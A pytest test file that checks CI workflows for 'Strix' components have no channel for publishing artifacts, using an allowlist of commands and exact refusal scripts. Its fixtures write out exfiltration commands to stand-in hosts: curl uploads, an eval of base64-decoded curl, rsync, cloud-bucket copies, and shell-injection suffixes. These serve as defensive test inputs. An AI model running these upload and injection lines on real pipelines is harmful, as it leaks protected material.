"""No public artifact channel exists while the component review is blocked.

A future publication exception needs a separately reviewed clearance contract and
an explicit policy change; operator strings and short retention are not one.
"""

import os
import shlex
import shutil
import subprocess
from copy import deepcopy
from pathlib import Path

import pytest
import yaml

from bluefire.strix_redistribution_review import strix_redistribution_review

ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS = (
    "strix-engine-candidate.yml",
    "strix-runtime-qualification.yml",
    "strix-runtime-admission.yml",
)
# The fixed setup actions may fetch inputs, but cannot publish payload directories.
SETUP_ACTIONS = {
    "actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803",
    "actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1",
    "actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e",
    "astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2",
}

# This is an allowlist, not a blacklist of upload verbs or sensitive filenames.
# Fixed module arguments prevent aliases, renamed staging paths, shell expansion,
# and indirect publication from evading a path/keyword scanner. A new command
# needs explicit review even if it appears unrelated to upstream material.
APPROVED_COMMANDS = {
    (
        "python",
        "-m",
        "tools.build_strix_engine_candidate",
        "--work-root",
        "$RUNNER_TEMP/bluefire-strix-candidate-work",
        "--output-root",
        "$RUNNER_TEMP/bluefire-strix-candidate-output",
        "--bluefire-source-revision",
        "${{ github.sha }}",
    ),
    (
        "python",
        "-m",
        "tools.qualify_strix_runtime_candidate",
        "--candidate-root",
        "$RUNNER_TEMP/bluefire-strix-candidate-output",
        "--source-root",
        "$RUNNER_TEMP/bluefire-strix-candidate-work/source",
        "--work-root",
        "$RUNNER_TEMP/bluefire-strix-qualification-work",
        "--output-root",
        "$RUNNER_TEMP/bluefire-strix-qualification-output",
        "--bluefire-source-revision",
        "${{ github.sha }}",
    ),
}

# Refusal is a shell program: statement separators and line boundaries affect
# whether exit executes at all. Never compare it after whitespace tokenization.
REFUSAL_SCRIPT = (
    "printf '%s\\n' 'Strix admission is blocked: component redistribution review is incomplete.' >&2\n"
    "printf '%s\\n' 'Public Actions artifacts cannot carry the candidate, source, wheelhouse, OCI data, or transfer bundle.' >&2\n"
    "printf '%s\\n' 'A reviewed private transport preserving fresh-runner isolation is required before this workflow can run.' >&2\n"
    "exit 2\n"
)


def _normalized_shell_commands(script: str) -> tuple[str, ...]:
    # shlex never executes anything. Quotes and whitespace normalize, while shell
    # operators, substitutions, variables, and injected commands remain tokens.
    # Reject comments too: Bash treats an attached # differently from shlex.
    # Do not evaluate aliases, environment variables, or workflow expressions.
    return tuple(shlex.split(script, comments=False, posix=True))


def _assert_no_public_artifact_channel(workflow: dict) -> None:
    review = strix_redistribution_review()
    assert review["redistribution_authorized"] is False
    assert review["license_review_complete"] is False
    assert not workflow.get("env") and not workflow.get("defaults")
    for job_id, job in workflow["jobs"].items():
        assert not any(job.get(key) for key in ("env", "defaults", "container", "services"))
        # Reusable jobs and unknown actions could conceal an uploader or cache.
        assert "uses" not in job, "No reviewed redistribution-clearance contract exists"
        for step in job["steps"]:
            assert not step.get("env") and "working-directory" not in step
            assert ("uses" in step) != ("run" in step)
            if "run" in step:
                assert step.get("shell") == "bash", "No reviewed shell-publication contract"
                if job_id == "publication_boundary":
                    assert step["run"] == REFUSAL_SCRIPT, (
                        "Admission refusal must preserve exact shell semantics"
                    )
                else:
                    assert _normalized_shell_commands(step["run"]) in APPROVED_COMMANDS, (
                        "No reviewed shell-publication contract"
                    )
            if "uses" in step:
                assert step["uses"] in SETUP_ACTIONS, (
                    "No reviewed redistribution-clearance contract exists"
                )
                settings = step.get("with", {})
                assert "cache" not in settings or settings["cache"] is False
                assert "enable-cache" not in settings or settings["enable-cache"] is False


@pytest.mark.parametrize("filename", WORKFLOWS)
def test_exact_strix_workflows_have_no_public_artifact_or_cache_channel(filename: str) -> None:
    workflow = yaml.safe_load((ROOT / ".github/workflows" / filename).read_text(encoding="utf-8"))
    _assert_no_public_artifact_channel(workflow)


@pytest.mark.parametrize(
    "payload",
    [
        "candidate-output",
        "source.tar.gz",
        "candidate.whl",
        "wheelhouse",
        "oci-image",
        "transfer.tar",
        "admission-output",
        "receipt.json",
        "*",
        ".",
    ],
)
@pytest.mark.parametrize(
    "action",
    [
        "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
        "actions/cache@" + "a" * 40,
        "third-party/upload@" + "b" * 40,
    ],
)
def test_upload_is_rejected_even_when_named_short_lived_or_operator_cleared(
    payload: str,
    action: str,
) -> None:
    workflow = yaml.safe_load(
        (ROOT / ".github/workflows" / WORKFLOWS[0]).read_text(encoding="utf-8")
    )
    workflow = deepcopy(workflow)
    workflow["jobs"]["build"]["steps"].append(
        {
            "name": "Short-lived reviewed transfer",
            "if": "${{ vars.STRIX_REDISTRIBUTION_CLEARED == 'true' }}",
            "uses": action,
            "with": {"path": "${{ runner.temp }}/" + payload, "retention-days": 1},
        }
    )
    with pytest.raises(AssertionError, match="No reviewed redistribution-clearance contract"):
        _assert_no_public_artifact_channel(workflow)


SHELL_PUBLICATION_MUTATIONS = [
    # The artifact may be renamed or moved before an uploader observes it.
    (
        "bash",
        'tar -cf "$RUNNER_TEMP/review.tar" "$RUNNER_TEMP/bluefire-strix-candidate-output"; curl -T "$RUNNER_TEMP/review.tar" https://uploads.invalid/file',
    ),
    ("bash", 'gh release upload evidence "$RUNNER_TEMP/bluefire-strix-candidate-output"'),
    ("bash", 'gh release create evidence "$RUNNER_TEMP/renamed.dat"'),
    (
        "bash",
        'gh api --method POST repos/owner/repo/actions/artifacts --input "$RUNNER_TEMP/transfer.tar"',
    ),
    (
        "bash",
        'curl -X POST --data-binary @"$RUNNER_TEMP/renamed.dat" https://uploads.github.com/repos/owner/repo/releases/1/assets?name=evidence',
    ),
    (
        "pwsh",
        'Invoke-WebRequest -Method Put -InFile "$env:RUNNER_TEMP/transfer.tar" -Uri https://uploads.invalid/file',
    ),
    (
        "bash",
        'az storage blob upload --file "$RUNNER_TEMP/source.tar.gz" --container-name evidence --name receipt',
    ),
    ("bash", 'aws s3 cp "$RUNNER_TEMP/wheelhouse" s3://public-evidence/ --recursive'),
    ("bash", 'gcloud storage cp "$RUNNER_TEMP/oci-image" gs://public-evidence/ --recursive'),
    (
        "bash",
        'payload="$RUNNER_TEMP/bluefire-strix-candidate-output"; destination=https://uploads.invalid/file; tar -cf /tmp/a "$payload"; command="curl"; "$command" -T /tmp/a "$destination"',
    ),
    (
        "bash",
        'cp -R "$RUNNER_TEMP/bluefire-strix-candidate-output" /tmp/innocent; rsync -a /tmp/innocent remote.invalid:public/',
    ),
    ("bash", 'eval "$(printf %s Y3VybCAtVCBmaWxlIGh0dHBzOi8vdXBsb2Fkcy5pbnZhbGlk | base64 -d)"'),
    (
        "bash",
        'python -c \'import urllib.request; urllib.request.urlopen("https://uploads.invalid/file", data=open("renamed.dat", "rb").read())\'',
    ),
    ("bash", "bash scripts/publish-receipt.sh"),
    (
        "bash",
        "pwsh -Command 'Invoke-WebRequest -Method Put -InFile renamed.dat -Uri https://uploads.invalid/file'",
    ),
]


@pytest.mark.parametrize(("shell", "script"), SHELL_PUBLICATION_MUTATIONS)
@pytest.mark.parametrize("placement", ["new-step", "append-to-approved-command"])
def test_shell_publication_fails_closed_even_with_path_or_command_indirection(
    shell: str,
    script: str,
    placement: str,
) -> None:
    workflow = yaml.safe_load(
        (ROOT / ".github/workflows" / WORKFLOWS[0]).read_text(encoding="utf-8")
    )
    steps = workflow["jobs"]["build"]["steps"]
    if placement == "new-step":
        steps.append({"name": "Sanitized short-lived evidence", "shell": shell, "run": script})
    else:
        steps[-1]["shell"] = shell
        steps[-1]["run"] += "\n" + script
    with pytest.raises(AssertionError, match="No reviewed shell-publication contract"):
        _assert_no_public_artifact_channel(workflow)


def test_shell_normalization_preserves_allowed_quoted_arguments_and_spacing() -> None:
    approved = next(tokens for tokens in APPROVED_COMMANDS if tokens[0] == "python")
    script = "  ".join(shlex.quote(token) for token in approved)
    assert _normalized_shell_commands(script) == approved


@pytest.mark.parametrize(
    "replacement",
    [
        "$PAYLOAD",
        "$RUNNER_TEMP/renamed",
        "$(curl https://uploads.invalid/file)",
        "`curl https://uploads.invalid/file`",
        "${{ inputs.output_root }}",
    ],
)
def test_approved_module_cannot_redirect_outputs_or_inject_shell_expansion(
    replacement: str,
) -> None:
    workflow = yaml.safe_load(
        (ROOT / ".github/workflows" / WORKFLOWS[0]).read_text(encoding="utf-8")
    )
    step = workflow["jobs"]["build"]["steps"][-1]
    step["run"] = step["run"].replace("$RUNNER_TEMP/bluefire-strix-candidate-output", replacement)
    with pytest.raises(AssertionError, match="No reviewed shell-publication contract"):
        _assert_no_public_artifact_channel(workflow)


@pytest.mark.parametrize(
    "injection",
    [
        '#; curl -T "$RUNNER_TEMP/bluefire-strix-candidate-output" https://uploads.invalid/file',
        '; curl -T "$RUNNER_TEMP/bluefire-strix-candidate-output" https://uploads.invalid/file',
        ' && aws s3 cp "$RUNNER_TEMP/bluefire-strix-candidate-output" s3://public-evidence/',
    ],
)
def test_attached_hash_and_shell_operators_cannot_hide_upload_after_approved_arguments(
    injection: str,
) -> None:
    workflow = yaml.safe_load(
        (ROOT / ".github/workflows" / WORKFLOWS[0]).read_text(encoding="utf-8")
    )
    step = workflow["jobs"]["build"]["steps"][-1]
    step["run"] += injection
    with pytest.raises(AssertionError, match="No reviewed shell-publication contract"):
        _assert_no_public_artifact_channel(workflow)


@pytest.mark.parametrize(
    "scope", ["workflow-env", "job-env", "step-env", "working-directory", "defaults"]
)
def test_shell_indirection_cannot_be_supplied_outside_the_run_script(scope: str) -> None:
    workflow = yaml.safe_load(
        (ROOT / ".github/workflows" / WORKFLOWS[0]).read_text(encoding="utf-8")
    )
    job = workflow["jobs"]["build"]
    if scope == "workflow-env":
        workflow["env"] = {"BASH_ENV": "$RUNNER_TEMP/publish.sh"}
    elif scope == "job-env":
        job["env"] = {"RUNNER_TEMP": "//network.invalid/public"}
    elif scope == "step-env":
        job["steps"][-1]["env"] = {"PYTHONPATH": "$RUNNER_TEMP/alternate-tools"}
    elif scope == "working-directory":
        job["steps"][-1]["working-directory"] = "$RUNNER_TEMP/alternate-tools"
    else:
        workflow["defaults"] = {"run": {"working-directory": "$RUNNER_TEMP/alternate-tools"}}
    with pytest.raises(AssertionError):
        _assert_no_public_artifact_channel(workflow)


REFUSAL_MUTATIONS = {
    "flattened": REFUSAL_SCRIPT.replace("\n", " "),
    "merged-exit": REFUSAL_SCRIPT.replace("\nexit 2\n", " exit 2\n"),
    "semicolon-flattened": REFUSAL_SCRIPT.replace("\n", "; "),
    "backslash-continued": REFUSAL_SCRIPT.replace("\nexit 2\n", " \\\nexit 2\n"),
    "commented-exit": REFUSAL_SCRIPT.replace("exit 2", "# exit 2"),
    "attached-comment": REFUSAL_SCRIPT.replace("\nexit 2", "# exit 2"),
    "extra-newline": REFUSAL_SCRIPT + "\n",
    "changed-exit": REFUSAL_SCRIPT.replace("exit 2", "exit 0"),
    "appended-success": REFUSAL_SCRIPT + "exit 0\n",
}


@pytest.mark.parametrize("script", REFUSAL_MUTATIONS.values(), ids=REFUSAL_MUTATIONS.keys())
def test_refusal_line_structure_cannot_be_flattened_or_reinterpreted(script: str) -> None:
    workflow = yaml.safe_load(
        (ROOT / ".github/workflows" / WORKFLOWS[2]).read_text(encoding="utf-8")
    )
    workflow["jobs"]["publication_boundary"]["steps"][0]["run"] = script
    with pytest.raises(
        AssertionError, match="Admission refusal must preserve exact shell semantics"
    ):
        _assert_no_public_artifact_channel(workflow)


def test_refusal_and_flattened_variant_have_different_actual_bash_semantics() -> None:
    git = shutil.which("git")
    bash = Path(git).parent.parent / "bin/bash.exe" if os.name == "nt" and git else None
    executable = str(bash) if bash and bash.is_file() else shutil.which("bash")
    if executable is None:
        pytest.skip("Bash is unavailable for execution-semantics verification")
    semantic_cases = {
        "original": (REFUSAL_SCRIPT, 2),
        "flattened": (REFUSAL_MUTATIONS["flattened"], 0),
        "merged-exit": (REFUSAL_MUTATIONS["merged-exit"], 0),
        "semicolon-flattened": (REFUSAL_MUTATIONS["semicolon-flattened"], 2),
        "backslash-continued": (REFUSAL_MUTATIONS["backslash-continued"], 0),
        "commented-exit": (REFUSAL_MUTATIONS["commented-exit"], 0),
        "extra-newline": (REFUSAL_MUTATIONS["extra-newline"], 2),
        "changed-exit": (REFUSAL_MUTATIONS["changed-exit"], 0),
        "appended-success": (REFUSAL_MUTATIONS["appended-success"], 2),
    }
    for name, (script, expected) in semantic_cases.items():
        result = subprocess.run(
            [executable, "--noprofile", "--norc", "-c", script],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if os.name == "nt" and "NtCreateDirectoryObject" in result.stderr:
            pytest.skip(
                "Sandbox prevents Git Bash startup; run this semantic check outside sandbox"
            )
        assert result.returncode == expected, (name, result.stderr)
